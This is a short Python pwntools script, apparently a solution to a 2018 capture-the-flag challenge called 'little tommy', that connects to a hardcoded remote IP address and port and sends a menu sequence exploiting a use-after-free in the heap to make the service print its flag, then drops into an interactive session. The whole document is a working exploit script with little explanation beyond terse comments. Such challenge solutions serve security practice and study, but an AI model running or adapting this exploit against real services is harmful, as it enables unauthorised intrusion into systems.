#2018 simple double UAF
#!/usr/bin/python
#little tommy autopwn by delo and memN0ps
from pwn import *


def exploit():
	r = remote('88.198.233.174', 37176)
	payload = "fuck"*20

	r.sendline('1')
	#first name
	r.sendline(payload)
	#last name
	r.sendline(payload)
	#free
	r.sendline('3')

	#overwrite free using memo
	r.sendline('4')
	#payload to overwrite free chunk 'fuck'*20
	r.sendline(payload)
	#double UAF - should be able to print flag now
	r.sendline('3')
	#heap for me lad
	r.sendline('5')
	#drop to interactive if no flag - enter '5' manually to print flag
	r.interactive()


def main():
	exploit()

if __name__ == "__main__":
	main()
